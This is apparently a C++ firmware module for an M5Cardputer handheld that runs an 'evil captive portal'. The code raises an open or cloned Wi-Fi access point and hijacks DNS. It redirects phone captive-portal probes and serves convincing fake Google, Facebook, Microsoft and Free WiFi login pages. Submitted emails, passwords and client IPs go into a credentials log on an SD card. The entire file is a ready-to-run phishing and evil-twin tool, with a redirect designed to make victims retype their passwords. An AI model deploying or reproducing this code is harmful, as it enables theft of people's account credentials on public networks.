/*
 * wifi_portal — evil captive portal with 4 phishing templates.
 *
 * Components:
 *   1. SoftAP with the chosen SSID (open network — no password).
 *   2. DNS server binds to port 53, answers every query with our AP IP
 *      so the victim's phone auto-opens the portal.
 *   3. HTTP server on port 80 serves the portal HTML and captures form
 *      POSTs (/login) into /poseidon/creds.log on SD card.
 *
 * Templates: Google, Facebook, Microsoft, Free WiFi. User picks one.
 *
 * AP Clone mode: same infra but the SoftAP's SSID is the most recently
 * selected real AP from wifi_scan (via g_last_selected_ap). Victim
 * devices that saved the real AP will auto-roam.
 */
#include "app.h"
#include "../theme.h"
#include "ui.h"
#include "input.h"
#include "radio.h"
#include "wifi_types.h"
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SD.h>
#include "../sd_helper.h"

struct portal_template_t { const char *name, *html; };

static const char HTML_GOOGLE[] = R"RAW(
<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Sign in - Google Accounts</title>
<style>body{font-family:Arial,sans-serif;background:#fff;margin:0}
.c{max-width:450px;margin:60px auto;padding:48px 40px;border:1px solid #dadce0;border-radius:8px}
h1{font-size:24px;font-weight:400;color:#202124;margin:16px 0 8px}
.s{color:#202124;font-size:16px;margin-bottom:24px}
input{width:100%;padding:12px 15px;margin:12px 0;border:1px solid #dadce0;border-radius:4px;font-size:16px;box-sizing:border-box}
button{background:#1a73e8;color:#fff;border:0;padding:10px 24px;border-radius:4px;font-weight:500;cursor:pointer;float:right;margin-top:16px}
.logo{width:75px;height:24px;margin:0 auto;display:block}
</style></head><body>
<div class="c">
<svg class="logo" viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg"><path fill="#4285F4" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/></svg>
<h1>Sign in</h1><div class="s">to continue to Gmail</div>
<form method="POST" action="/login">
<input name="u" type="email" placeholder="Email or phone" required>
<input name="p" type="password" placeholder="Password" required>
<button type="submit">Next</button>
</form></div></body></html>
)RAW";

static const char HTML_FREEWIFI[] = R"RAW(
<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Free WiFi - Authentication Required</title>
<style>body{font-family:-apple-system,Arial,sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center}
.c{background:#fff;padding:40px;border-radius:12px;max-width:400px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.3)}
h1{margin:0 0 8px;color:#333}p{color:#666;margin-bottom:24px}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:6px;box-sizing:border-box;font-size:16px}
button{width:100%;padding:14px;background:#667eea;color:#fff;border:0;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer}
.w{width:60px;height:60px;margin:0 auto 20px;display:block}
</style></head><body>
<div class="c">
<svg class="w" viewBox="0 0 24 24" fill="#667eea"><path d="M12 3C7.95 3 4.21 4.34 1.2 6.6L3 9c2.71-2.03 6.01-3 9-3s6.29.97 9 3l1.8-2.4C19.79 4.34 16.05 3 12 3zm0 4c-2.96 0-5.74.73-8.2 2L5.4 11.4C7.38 10.18 9.62 9.5 12 9.5s4.62.68 6.6 1.9L20.2 9C17.74 7.73 14.96 7 12 7zm0 4c-1.96 0-3.72.54-5.3 1.5l1.8 2.4c1.04-.6 2.2-.9 3.5-.9s2.46.3 3.5.9l1.8-2.4C15.72 11.54 13.96 11 12 11zm0 4.5c-1.11 0-2.08.39-2.85 1.05L12 20l2.85-3.45C14.08 15.89 13.11 15.5 12 15.5z"/></svg>
<h1>Free WiFi</h1><p>Please sign in with your email to continue.</p>
<form method="POST" action="/login">
<input name="u" type="email" placeholder="Email address" required>
<input name="p" type="password" placeholder="Password" required>
<button>Connect</button>
</form></div></body></html>
)RAW";

static const char HTML_FACEBOOK[] = R"RAW(
<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Log in to Facebook</title>
<style>body{background:#f0f2f5;font-family:Helvetica,Arial,sans-serif;margin:0;padding:80px 20px;text-align:center}
.c{background:#fff;padding:20px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1);max-width:400px;margin:auto}
h1{color:#1877f2;font-size:56px;margin:0 0 20px}
input{width:100%;padding:14px;margin:6px 0;border:1px solid #dddfe2;border-radius:6px;box-sizing:border-box;font-size:17px}
button{width:100%;background:#1877f2;color:#fff;border:0;padding:12px;border-radius:6px;font-weight:700;font-size:20px;cursor:pointer;margin-top:6px}
</style></head><body>
<div class="c"><h1>facebook</h1>
<form method="POST" action="/login">
<input name="u" type="text" placeholder="Email or phone number" required>
<input name="p" type="password" placeholder="Password" required>
<button>Log In</button></form></div></body></html>
)RAW";

static const char HTML_MICROSOFT[] = R"RAW(
<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Sign in to your Microsoft account</title>
<style>body{font-family:'Segoe UI',Arial,sans-serif;background:#fff;margin:0}
.c{max-width:440px;margin:40px auto;padding:44px;border:1px solid #ebebeb;box-shadow:0 2px 6px rgba(0,0,0,0.2)}
.logo{width:108px;margin-bottom:24px}
h1{font-size:24px;font-weight:600;color:#1b1b1b;margin:0 0 16px}
input{width:100%;padding:6px 10px;margin:4px 0;border:0;border-bottom:1px solid #666;font-size:15px;box-sizing:border-box;outline:none}
button{background:#0067b8;color:#fff;border:0;padding:6px 12px;min-width:108px;font-size:15px;float:right;margin-top:16px;cursor:pointer}
</style></head><body>
<div class="c">
<svg class="logo" viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg"><rect x="0"  y="0" width="10" height="10" fill="#F25022"/><rect x="12" y="0" width="10" height="10" fill="#7FBA00"/><rect x="0"  y="12" width="10" height="10" fill="#00A4EF"/><rect x="12" y="12" width="10" height="10" fill="#FFB900"/></svg>
<h1>Sign in</h1>
<form method="POST" action="/login">
<input name="u" type="email" placeholder="Email, phone, or Skype" required>
<input name="p" type="password" placeholder="Password" required>
<button>Next</button>
</form></div></body></html>
)RAW";

static const portal_template_t s_templates[] = {
    { "Google",    HTML_GOOGLE    },
    { "Facebook",  HTML_FACEBOOK  },
    { "Microsoft", HTML_MICROSOFT },
    { "Free WiFi", HTML_FREEWIFI  },
};
#define TEMPLATE_COUNT (sizeof(s_templates)/sizeof(s_templates[0]))

static WebServer *s_http = nullptr;
static DNSServer *s_dns  = nullptr;
static volatile uint32_t s_creds = 0;
static volatile uint32_t s_hits  = 0;
static const char *s_current_html = HTML_GOOGLE;
static char s_portal_ssid[33] = "Free WiFi";

static void log_cred(const String &u, const String &p, const String &src)
{
    File f = SD.open("/poseidon/creds.log", FILE_APPEND);
    if (!f) return;
    f.printf("%lu,%s,%s,%s,%s\n",
             (unsigned long)(millis() / 1000),
             s_portal_ssid, src.c_str(), u.c_str(), p.c_str());
    f.close();
    s_creds++;
}

static void handle_login(void)
{
    String u = s_http->arg("u");
    String p = s_http->arg("p");
    if (u.length() > 0 || p.length() > 0) {
        log_cred(u, p, s_http->client().remoteIP().toString());
    }
    /* Show "please wait" then redirect back — convinces victim to retry. */
    s_http->send(200, "text/html",
        "<html><body style='font:16px Arial;text-align:center;padding:60px'>"
        "<h2>Please wait...</h2><p>Authenticating.</p>"
        "<script>setTimeout(function(){location='/'},2000)</script>"
        "</body></html>");
}

static void handle_root(void)
{
    s_hits++;
    s_http->send_P(200, "text/html", s_current_html);
}

/* Captive portal probe URLs — return 302 to root so Android/iOS/Windows
 * pop up the login sheet automatically. */
static void handle_probe(void)
{
    s_hits++;
    s_http->sendHeader("Location", "/", true);
    s_http->send(302, "text/plain", "");
}

static int pick_template(void)
{
    ui_clear_body();
    auto &d = M5Cardputer.Display;
    d.setTextColor(T_ACCENT, T_BG);
    d.setCursor(4, BODY_Y + 2); d.print("EVIL PORTAL");
    d.drawFastHLine(4, BODY_Y + 12, 110, T_ACCENT);
    d.setTextColor(T_FG, T_BG);
    for (size_t i = 0; i < TEMPLATE_COUNT; ++i) {
        d.setCursor(4, BODY_Y + 22 + (int)i * 12);
        d.printf("[%d] %s", (int)(i + 1), s_templates[i].name);
    }
    d.setTextColor(T_DIM, T_BG);
    d.setCursor(4, BODY_Y + 22 + (int)TEMPLATE_COUNT * 12);
    d.print("[C] Clone last scanned AP");
    ui_draw_footer("letter/1-4=pick  C=clone  `=back");
    while (true) {
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) return -1;
        if (k >= '1' && k <= '0' + (int)TEMPLATE_COUNT) return k - '1';
        if (k == 'c' || k == 'C') return -2;  /* clone mode */
    }
}

static void run_portal(void)
{
    if (!sd_mount()) {
        ui_toast("SD needed for logs", T_BAD, 1500);
        return;
    }
    SD.mkdir("/poseidon");

    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1),
                       IPAddress(192, 168, 4, 1),
                       IPAddress(255, 255, 255, 0));
    WiFi.softAP(s_portal_ssid, nullptr, 1, 0, 8);  /* open, 8 max clients */

    IPAddress ip = WiFi.softAPIP();

    s_dns = new DNSServer();
    s_dns->setErrorReplyCode(DNSReplyCode::NoError);
    s_dns->start(53, "*", ip);

    s_http = new WebServer(80);
    s_http->on("/",                      handle_root);
    s_http->on("/login",      HTTP_POST, handle_login);
    /* Common captive-portal probe URLs. */
    s_http->on("/generate_204",          handle_probe);  /* Android */
    s_http->on("/hotspot-detect.html",   handle_probe);  /* iOS */
    s_http->on("/ncsi.txt",              handle_probe);  /* Windows */
    s_http->on("/success.txt",           handle_probe);  /* Firefox */
    s_http->on("/connecttest.txt",       handle_probe);  /* Windows */
    s_http->onNotFound(                  handle_root);
    s_http->begin();

    s_creds = 0; s_hits = 0;

    ui_clear_body();
    auto &d = M5Cardputer.Display;
    d.setTextColor(T_BAD, T_BG);
    d.setCursor(4, BODY_Y + 2); d.print("PORTAL ACTIVE");
    d.drawFastHLine(4, BODY_Y + 12, 110, T_BAD);
    d.setTextColor(T_ACCENT, T_BG);
    d.setCursor(4, BODY_Y + 18); d.printf("SSID: %s", s_portal_ssid);
    d.setCursor(4, BODY_Y + 30); d.printf("IP:   %s", ip.toString().c_str());
    ui_draw_footer("`=stop");

    uint32_t last = 0;
    while (true) {
        s_dns->processNextRequest();
        s_http->handleClient();

        if (millis() - last > 250) {
            last = millis();
            d.fillRect(0, BODY_Y + 42, SCR_W, 40, T_BG);
            d.setTextColor(T_FG, T_BG);
            d.setCursor(4, BODY_Y + 42); d.printf("clients: %d", WiFi.softAPgetStationNum());
            d.setCursor(4, BODY_Y + 54); d.printf("hits:    %lu", (unsigned long)s_hits);
            d.setTextColor(s_creds > 0 ? T_GOOD : T_DIM, T_BG);
            d.setCursor(4, BODY_Y + 66); d.printf("creds:   %lu", (unsigned long)s_creds);
            ui_draw_status(radio_name(), "portal");
        }

        uint16_t k = input_poll();
        if (k == PK_ESC) break;
        if (k == PK_NONE) { delay(5); }
    }

    if (s_http) { s_http->close(); delete s_http; s_http = nullptr; }
    if (s_dns)  { s_dns->stop();  delete s_dns;  s_dns  = nullptr; }
    WiFi.softAPdisconnect(true);
}

void feat_wifi_portal(void)
{
    radio_switch(RADIO_WIFI);
    int t = pick_template();
    if (t == -1) return;
    if (t == -2) {
        if (!g_last_selected_valid) {
            ui_toast("scan an AP first", T_WARN, 1200);
            return;
        }
        strncpy(s_portal_ssid, g_last_selected_ap.ssid, sizeof(s_portal_ssid) - 1);
        s_portal_ssid[sizeof(s_portal_ssid) - 1] = '\0';
        s_current_html = HTML_FREEWIFI;  /* generic for clone */
    } else {
        strncpy(s_portal_ssid, s_templates[t].name, sizeof(s_portal_ssid) - 1);
        s_portal_ssid[sizeof(s_portal_ssid) - 1] = '\0';
        s_current_html = s_templates[t].html;
    }
    run_portal();
}

/* AP Clone = portal with victim AP's SSID. */
void feat_wifi_apclone(void)
{
    radio_switch(RADIO_WIFI);
    if (!g_last_selected_valid) {
        ui_toast("scan + select AP first", T_WARN, 1500);
        return;
    }
    strncpy(s_portal_ssid, g_last_selected_ap.ssid, sizeof(s_portal_ssid) - 1);
    s_portal_ssid[sizeof(s_portal_ssid) - 1] = '\0';
    s_current_html = HTML_FREEWIFI;
    run_portal();
}
